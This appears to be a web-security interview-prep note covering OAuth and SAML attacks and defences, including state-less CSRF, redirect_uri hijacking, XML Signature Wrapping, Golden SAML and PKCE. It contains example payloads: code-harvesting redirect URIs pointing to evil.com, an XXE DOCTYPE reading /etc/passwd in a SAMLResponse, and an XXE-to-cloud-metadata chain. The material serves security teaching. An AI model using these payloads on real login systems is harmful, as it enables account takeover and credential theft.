---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 19"
---

# Web QnA - Module 19 - OAuth and SAML Attacks

## Architectural Overview: OAuth 2.0 Authorization Code Flow Interception

```text
    [ Victim Browser ]                        [ Attacker ]
           |                                       |
           | 1. Clicks "Login with Google"         |
           |-------------------------------------->| (Attacker observes URL)
           |                                       |
    [ OAuth Provider (IdP) ]                       |
           | 2. Auth URL:                          |
           | /authorize?client_id=123&             |
           | redirect_uri=https://app.com/cb       |
           | &response_type=code                   |
           |                                       |
           | 3. User Approves                      |
           |<--------------------------------------|
           |                                       |
           | 4. Redirects with Code                |
           |-------------------------------------->| [ Victim Browser ]
           | Location: https://app.com/cb?code=XYZ |        |
                                                            |
                 [!] Attack Vector: Lack of 'state'         |
                 Attacker generates their own code 'ABC'    |
                 and forces victim's browser to visit       |
                 https://app.com/cb?code=ABC                |
                 Victim is now logged into Attacker's account!
```

## Formal Technical Questions

**Q1: In the OAuth 2.0 framework, explain the critical difference between the `Implicit Flow` and the `Authorization Code Flow`. Why is the Implicit Flow considered highly insecure?**
**A1:** 
The **Authorization Code Flow** is a server-to-server mechanism. The client browser is redirected to the Identity Provider (IdP), authenticates, and is sent back with a short-lived `code`. The web application's *backend server* then securely exchanges this `code` (along with its secret `client_secret`) directly with the IdP via a backchannel HTTP request to receive the Access Token. The token is never exposed to the browser.
The **Implicit Flow** was designed for Single Page Applications (SPAs) without a backend. The IdP returns the Access Token *directly in the URL fragment* (e.g., `https://app.com/#access_token=eyJ...`). 
It is highly insecure because:
1. The token is exposed in the browser's URL history.
2. It is vulnerable to interception via Open Redirects or Referer header leaks.
3. Any XSS vulnerability allows immediate extraction of the Access Token from the URL or memory. 
Modern standards (OAuth 2.1) explicitly deprecate the Implicit Flow in favor of Authorization Code with PKCE.

**Q2: What is XML Signature Wrapping (XSW) in the context of SAML, and how does it compromise authentication?**
**A2:** 
SAML responses are complex XML documents signed by the IdP. The digital signature ensures the integrity of the claims (e.g., `<NameID>admin@company.com</NameID>`).
XML Signature Wrapping (XSW) exploits how backend XML parsers validate the signature versus how they extract the data. 
In an XSW attack, the attacker clones the legitimate, signed assertion and moves it to a different part of the XML tree. They then create a *fake* assertion containing malicious claims (e.g., an Admin email) and place it where the application logic looks for data.
The flaw occurs when the cryptographic library successfully verifies the signature on the *moved* original assertion, returning `Valid`. The application logic then parses the XML to log the user in, but it blindly reads the *fake* assertion. The attacker successfully logs in as the victim without invalidating the cryptographic signature.

**Q3: Describe how manipulating the `redirect_uri` parameter in an OAuth flow can lead to Account Takeover.**
**A3:** 
The `redirect_uri` parameter dictates where the IdP sends the user (along with the Authorization Code or Token) after successful authentication.
If the client application does not strictly validate this parameter, an attacker can initiate an OAuth flow but change the `redirect_uri` to a server they control:
`https://idp.com/auth?client_id=123&redirect_uri=https://evil.com/steal`
The attacker sends this link to the victim. The victim, seeing the legitimate IdP domain, logs in. The IdP then redirects the victim to `https://evil.com/steal?code=SECRET_CODE`. The attacker harvests the code, exchanges it for an Access Token at the IdP, and gains full access to the victim's account on the target application.

## Scenario-Based Questions

**Q4: You are reviewing an application's OAuth implementation. The flow uses the Authorization Code type. However, you notice there is no `state` parameter included in the initial authorization request. How do you exploit this to compromise a victim?**
**A4:** 
The absence of the `state` parameter leaves the application vulnerable to an OAuth Cross-Site Request Forgery (CSRF) attack, commonly resulting in a "Login CSRF" or account hijacking scenario.
1. I log into the target application using my own credentials via the IdP.
2. The IdP redirects me back with an authorization code: `https://app.com/callback?code=ATTACKER_CODE`.
3. I intercept and drop this request before it reaches the server, saving `ATTACKER_CODE`.
4. I craft a malicious link or embed an invisible iframe pointing to `https://app.com/callback?code=ATTACKER_CODE`.
5. I trick the victim into clicking the link.
6. The victim's browser submits *my* code to the application. The application backend exchanges it and links *my* IdP account to the victim's current web session. 
If the victim subsequently enters sensitive data (like adding a credit card), it is saved to an account I control.

**Q5: A client application uses SAML for SSO. You capture the SAMLResponse in Burp Suite, decode it from Base64, and notice the XML data contains user profile information. The signature is robust against XSW. Is there another critical Web vulnerability you should test the XML parser for? How?**
**A5:** 
Yes, since SAML relies on parsing XML, it is inherently vulnerable to XML External Entity (XXE) injection. 
Even if the signature is validated later, the XML parser often parses the document *first* to build the DOM tree. 
I would decode the `SAMLResponse`, inject a malicious DOCTYPE payload defining an external entity pointing to a local file or an out-of-band server:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response ...>
   <Issuer>&xxe;</Issuer>
...
```
I would re-encode this to Base64 and submit it. If the server is vulnerable to XXE, it will process the entity during parsing, either returning the contents of `/etc/passwd` in an error message or executing a blind out-of-band request, completely bypassing the signature check.

**Q6: You are performing a Red Team assessment. You compromised an Active Directory Federation Services (ADFS) server, which acts as the SAML IdP for the target organization's AWS environment. You extract the token-signing private key. What is the name of the attack you can now perform, and what is the impact?**
**A6:** 
This is a **Golden SAML** attack. 
By possessing the IdP's token-signing private key, I can generate perfectly valid, offline SAML assertions for any user, with any claims, targeting any Service Provider (SP) that trusts this IdP.
I would forge a SAMLResponse asserting that I am a Domain Admin or an AWS Cloud Administrator. I sign this response with the stolen private key. When I submit this forged assertion to AWS or any internal web application, they will cryptographically verify the signature, trust the assertion implicitly, and grant me total administrative access. This bypasses all multi-factor authentication (MFA) because the SP assumes the IdP already enforced it.

## Deep-Dive Defensive Questions

**Q7: Explain Proof Key for Code Exchange (PKCE) and why it is mandatory for mobile applications and highly recommended for modern web applications over traditional client secrets.**
**A7:** 
In traditional OAuth Authorization Code flow, the backend uses a static `client_secret` to exchange the code for a token. In mobile apps or SPAs, this secret cannot be safely stored—anyone can reverse-engineer the app and extract the secret.
PKCE (RFC 7636) solves this by dynamically creating a unique "secret" per session. 
1. The client generates a random `code_verifier` and its hash, the `code_challenge`.
2. The client sends the `code_challenge` in the initial authorization URL. The IdP stores it.
3. After authentication, the client receives the Authorization Code.
4. When exchanging the code for a token, the client sends the plaintext `code_verifier` (no static secret is used).
5. The IdP hashes the `code_verifier`. If it matches the previously stored `code_challenge`, the token is issued.
This prevents interception attacks. Even if an attacker steals the Authorization Code, they cannot exchange it because they do not have the dynamically generated `code_verifier`.

**Q8: What specific SAML configuration changes must a developer make to mitigate XML Signature Wrapping (XSW) attacks?**
**A8:** 
Mitigating XSW requires strict validation logic tying the cryptographic signature directly to the business data.
1. **Strict XPath Evaluation:** The XML parser must be configured to only extract claims (like `NameID`) from the exact XML node that the signature explicitly references. 
2. **Require Signed Assertions, Not Just Responses:** The signature must cover the `<Assertion>` element itself, not just the outer `<Response>` wrapper. An attacker can easily wrap a fake assertion in a signed response wrapper if the SP doesn't check inner signatures.
3. **ID Validation:** Ensure that the `ID` attribute of the element being verified matches the `Reference URI` specified in the `Signature` block, and verify that this ID is unique within the document to prevent duplicated, moved nodes.

## Real-World Attack Scenario

**The Open Redirect OAuth Hijack**
A popular file-sharing application implemented "Login with Facebook". The application's `redirect_uri` validation was flawed: it only checked if the URL started with `https://fileshare.com`.

1. **Reconnaissance:** The attacker discovered an Open Redirect vulnerability on the main site: `https://fileshare.com/out?url=https://evil.com`.
2. **Exploitation:** The attacker crafted an OAuth authorization link:
`https://facebook.com/dialog/oauth?client_id=123&redirect_uri=https://fileshare.com/out?url=https://evil.com`
3. **Execution:** The attacker sent this link to a victim. Because the `redirect_uri` started with `https://fileshare.com`, Facebook's validation passed.
4. **Impact:** The victim authenticated with Facebook. Facebook redirected them to `https://fileshare.com/out?url=https://evil.com&code=VICTIM_SECRET_CODE`. 
The open redirect immediately forwarded the victim's browser to `evil.com`, passing the `code` in the URL. The attacker's server logged the code, exchanged it for an access token, and hijacked the victim's file-sharing account.

## Chaining Opportunities

- **Host Header Injection -> OAuth Token Leak:** Poisoning the host header during the OAuth callback phase to force the application backend to send the authorization code to an attacker-controlled host.
- **XXE in SAML -> SSRF -> Cloud Metadata:** Exploiting XXE in the SAML parser to ping internal AWS metadata endpoints, stealing IAM instance profiles.
- **XSS -> Implicit Flow Token Extraction:** Using Stored XSS to silently trigger an iframe OAuth Implicit flow, harvesting the access token from the URL fragment in the DOM.

## Related Notes
- [[11 - Cross-Site Request Forgery (CSRF)]]
- [[15 - XML External Entities (XXE)]]
- [[04 - Session Management Vulnerabilities]]
- [[22 - Open Redirect Vulnerabilities]]
